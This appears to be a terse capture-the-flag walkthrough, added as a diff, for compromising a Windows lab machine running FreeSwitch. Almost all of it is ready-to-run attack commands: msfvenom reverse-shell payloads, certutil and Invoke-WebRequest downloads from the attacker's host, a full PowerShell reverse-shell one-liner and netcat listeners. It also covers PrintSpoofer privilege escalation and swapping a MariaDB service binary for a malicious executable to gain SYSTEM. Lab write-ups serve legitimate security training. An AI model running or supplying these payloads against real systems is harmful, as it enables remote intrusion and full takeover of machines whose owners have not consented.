@@ -1,0 +1,78 @@
+nmap -sS -sV -vv -T4 -Pn <machine_ip>
+
+
+
+port 8021 is open and FreeSwitch run on that port
+
+
+searchsploit -w FreeSwitch
+
+https://www.exploit-db.com/exploits/47799
+
+-----------------------------------------------------------------------------
+Method1:
+
+msfvenom -p windows/x64/shell/reverse_tcp lhost="listener_ip" lport="listener_port" -f exe -o shell.exe
+python3 -m http.server 80
+python3 exploit.py <target_ip> "certutil -urlcache -split -f http://<my_kali_ip/shell.exe>"
+
+we must listening another machine 
+nc -nvlp <listening_port>
+
+
+python3 exploit.py <machine_ip> "shell.exe"
+
+
+
+------------------------------------------------------
+priv esc : 
+whoami /priv
+
+SeImpersonatePrivilege is enabled
+on my kali machine --> git clone https://github.com/dievus/printspoofer
+
+certutil -urlcache -split -f http://<mykaliip/PrintSpoofer.exe>
+
+PrintSpoofer.exe -i -c cmd 
+
+bingo !
+
+--------------------------------------------------------------------------------------
+Method 2
+nano revshell.ps1
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('listener_ip',listener_port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+and we must listen another terminal with nc
+nc -nvlp <listener_ip>
+
+python3 exploit.py <target_ip> $(cat revshell.ps1)
+
+PS : cd c:\projects\openclinic
+openclinic is the vulnerable projects!
+
+
+on my kali machine : 
+msfvenom -p windows/shell_reverse_tcp lhost=my_ip LPORT=listenerport -f exe > fake_mysqld.exe
+python3 -m http.server 80
+PS : cd c:\projects\openclinic\mariadb\bin 
+PS : Move-Item mysqld.exe mysqld.bak (or another extensions..)
+PS : Invoke-WebRequest -OutFile mysqld.exe -Uri http://10.18.34.91/fake_mysqld.exe
+listen another terminal 
+
+nc -nvlp listener_port
+
+PS : Restart-Computer
+
+
+ bingo !
+ 
+ C:> whoami
+ nt-authority/system
+ 
+ 
+ cd c:\Users\Nektoric\Desktop
+ more user.txt
+ THM{good_machine}
+ 
+ more root.txt
+ THM{thank_you_Nekrotic!}
